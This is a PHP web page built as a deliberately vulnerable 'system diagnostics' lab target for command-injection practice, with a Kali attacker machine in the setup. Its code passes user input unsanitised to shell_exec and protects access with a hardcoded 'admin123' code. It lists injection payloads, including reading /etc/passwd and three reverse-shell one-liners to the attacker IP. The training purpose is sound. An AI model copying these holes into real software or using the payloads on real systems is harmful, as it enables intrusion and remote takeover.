<?php
/*
H&F Tactical Solutions - System Diagnostics
INTENTIONALLY VULNERABLE FOR COMMAND INJECTION TESTING
*/

// Simple authentication check (easily bypassable)
$authenticated = false;
if (isset($_GET['auth']) && $_GET['auth'] == 'admin123') {
    $authenticated = true;
}

// Handle diagnostic commands
$output = '';
$command = '';
if ($_POST['action'] == 'diagnose' && isset($_POST['target'])) {
    $target = $_POST['target'];
    $command = $_POST['command'] ?? 'ping';
    
    // VULNERABLE: Direct command execution without sanitization
    // Detect Windows vs Linux for proper commands
    $isWindows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

    if ($command == 'ping') {
        if ($isWindows) {
            $cmd = "ping -n 4 " . $target;  // Windows: -n instead of -c
        } else {
            $cmd = "ping -c 4 " . $target;  // Linux: -c
        }
    } elseif ($command == 'nslookup') {
        $cmd = "nslookup " . $target;
    } elseif ($command == 'traceroute') {
        if ($isWindows) {
            $cmd = "tracert " . $target;     // Windows: tracert
        } else {
            $cmd = "traceroute " . $target;  // Linux: traceroute
        }
    } elseif ($command == 'netstat') {
        if ($isWindows) {
            $cmd = "netstat -an | findstr " . $target;  // Windows: findstr
        } else {
            $cmd = "netstat -an | grep " . $target;     // Linux: grep
        }
    } else {
        $cmd = $command . " " . $target;
    }
    
    // Execute command and capture output
    echo "<!-- DEBUG: OS detected as " . ($isWindows ? "Windows" : "Linux") . " -->";
    echo "<!-- DEBUG: Full command: " . htmlspecialchars($cmd) . " -->";

    $output = shell_exec($cmd . " 2>&1");

    // Add debug info if no output
    if (empty($output)) {
        $output = "No output received. Possible issues:\n";
        $output .= "- shell_exec() may be disabled\n";
        $output .= "- Command may not exist on this system\n";
        $output .= "- Permissions issue\n";
        $output .= "- Network connectivity problem\n\n";
        $output .= "PHP Info:\n";
        $output .= "OS: " . PHP_OS . "\n";
        $output .= "shell_exec enabled: " . (function_exists('shell_exec') ? 'YES' : 'NO') . "\n";
        $output .= "exec enabled: " . (function_exists('exec') ? 'YES' : 'NO') . "\n";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>H&F Tactical - System Diagnostics</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 0; 
            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
            color: white;
            min-height: 100vh;
        }
        .container { 
            max-width: 1000px; 
            margin: 0 auto; 
            padding: 20px; 
        }
        .header { 
            background: linear-gradient(135deg, #ff6b35, #ff8c42);
            padding: 20px; 
            margin: -20px -20px 30px -20px; 
            border-radius: 0 0 15px 15px;
            text-align: center;
        }
        .auth-form {
            background: rgba(255, 107, 53, 0.1);
            padding: 30px;
            border-radius: 10px;
            border: 1px solid #ff6b35;
            text-align: center;
            margin: 50px auto;
            max-width: 400px;
        }
        .diagnostic-panel {
            background: rgba(255, 255, 255, 0.05);
            padding: 25px;
            border-radius: 10px;
            border: 1px solid #333;
            margin: 20px 0;
        }
        .form-group { 
            margin: 15px 0; 
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            font-weight: bold;
            color: #ff6b35;
        }
        input[type="text"], select, textarea { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid #555; 
            border-radius: 5px; 
            background: #2a2a2a;
            color: white;
            font-size: 14px;
        }
        button { 
            background: linear-gradient(135deg, #ff6b35, #ff8c42);
            color: white; 
            padding: 12px 25px; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            font-size: 16px;
            font-weight: bold;
        }
        button:hover { 
            background: linear-gradient(135deg, #ff8c42, #ffaa42);
            transform: translateY(-2px);
        }
        .output {
            background: #000;
            color: #00ff00;
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            margin: 20px 0;
            border: 1px solid #333;
            max-height: 400px;
            overflow-y: auto;
        }
        .command-display {
            background: rgba(255, 107, 53, 0.1);
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #ff6b35;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
        }
        .vulnerability-info {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff4444;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
        }
        .examples {
            background: rgba(255, 255, 0, 0.1);
            border: 1px solid #ffaa00;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
        }
        .examples code {
            background: rgba(0, 0, 0, 0.3);
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 H&F TACTICAL SOLUTIONS</h1>
            <h2>System Diagnostics Portal</h2>
            <p>Network Analysis & System Monitoring</p>
        </div>

        <?php if (!$authenticated): ?>
            <div class="auth-form">
                <h3>🔐 Administrative Access Required</h3>
                <p>This diagnostic tool requires administrative privileges.</p>
                <form method="GET">
                    <div class="form-group">
                        <label>Access Code:</label>
                        <input type="text" name="auth" placeholder="Enter admin access code">
                    </div>
                    <button type="submit">Authenticate</button>
                </form>
                <p style="margin-top: 20px; font-size: 12px; color: #888;">
                    Hint: Default access code is "admin123"
                </p>
            </div>
        <?php else: ?>
            
            <div class="diagnostic-panel">
                <h3>🔧 Network Diagnostic Tools</h3>
                <form method="POST">
                    <input type="hidden" name="action" value="diagnose">
                    
                    <div class="form-group">
                        <label>Diagnostic Command:</label>
                        <select name="command" id="command">
                            <option value="ping">Ping Test</option>
                            <option value="nslookup">DNS Lookup</option>
                            <option value="traceroute">Trace Route</option>
                            <option value="netstat">Network Status</option>
                            <option value="custom">Custom Command</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label>Target Host/IP:</label>
                        <input type="text" name="target" value="<?php echo htmlspecialchars($_POST['target'] ?? '8.8.8.8'); ?>" 
                               placeholder="Enter IP address or hostname">
                    </div>
                    
                    <button type="submit">🚀 Run Diagnostic</button>
                </form>
            </div>

            <?php if (!empty($cmd)): ?>
                <div class="command-display">
                    <strong>Executed Command:</strong><br>
                    <code style="color: #ff6b35;"><?php echo htmlspecialchars($cmd); ?></code>
                </div>
            <?php endif; ?>

            <?php if (!empty($output)): ?>
                <div class="output">
                    <strong>Command Output:</strong><br><br><?php echo htmlspecialchars($output); ?>
                </div>
            <?php endif; ?>

            <div class="vulnerability-info">
                <h3>⚠️ VULNERABILITY TESTING INFORMATION</h3>
                <p><strong>This page is intentionally vulnerable to command injection for security testing purposes.</strong></p>
                <p>The application directly executes user input without proper sanitization, allowing attackers to inject additional commands.</p>
            </div>

            <div class="examples">
                <h3>🔓 Command Injection Testing Examples</h3>
                
                <h4>Basic Command Injection:</h4>
                <ul>
                    <li><code>8.8.8.8; whoami</code> - Execute whoami command</li>
                    <li><code>8.8.8.8 && id</code> - Show user ID</li>
                    <li><code>8.8.8.8 | cat /etc/passwd</code> - Read password file (Linux)</li>
                    <li><code>8.8.8.8 & dir</code> - List directory (Windows)</li>
                </ul>

                <h4>Information Gathering:</h4>
                <ul>
                    <li><code>8.8.8.8; uname -a</code> - System information</li>
                    <li><code>8.8.8.8 && ps aux</code> - Running processes</li>
                    <li><code>8.8.8.8 | netstat -an</code> - Network connections</li>
                    <li><code>8.8.8.8; ls -la /</code> - Root directory listing</li>
                </ul>

                <h4>File System Access:</h4>
                <ul>
                    <li><code>8.8.8.8; cat /etc/hosts</code> - Read hosts file</li>
                    <li><code>8.8.8.8 && find / -name "*.conf"</code> - Find config files</li>
                    <li><code>8.8.8.8 | cat logs/*.log</code> - Read log files</li>
                </ul>

                <h4>Reverse Shell Attempts:</h4>
                <ul>
                    <li><code>8.8.8.8; nc -e /bin/sh 192.168.50.102 4444</code> - Netcat reverse shell</li>
                    <li><code>8.8.8.8 && bash -i >& /dev/tcp/192.168.50.102/4444 0>&1</code> - Bash reverse shell</li>
                    <li><code>8.8.8.8; python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.50.102',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"</code></li>
                </ul>

                <p><strong>Note:</strong> Replace <code>192.168.50.102</code> with your Kali Linux IP address for reverse shell testing.</p>
            </div>

        <?php endif; ?>

        <div style="margin-top: 40px; padding: 20px; background: rgba(255, 255, 255, 0.05); border-radius: 8px;">
            <h4>🎯 Testing Environment Setup:</h4>
            <p><strong>Kali Linux (Attacker):</strong> 192.168.50.102</p>
            <p><strong>Windows Target:</strong> Host this PHP file on Windows with XAMPP/WAMP</p>
            <p><strong>Database:</strong> MySQL with hf_tactical database loaded</p>
            <p><strong>Access URL:</strong> http://[windows-ip]/diagnostics.php?auth=admin123</p>
        </div>
    </div>

    <script>
        // Auto-fill custom command field
        document.getElementById('command').addEventListener('change', function() {
            if (this.value === 'custom') {
                document.querySelector('input[name="target"]').placeholder = 'Enter full command (e.g., ls -la)';
            } else {
                document.querySelector('input[name="target"]').placeholder = 'Enter IP address or hostname';
            }
        });
    </script>
</body>
</html>
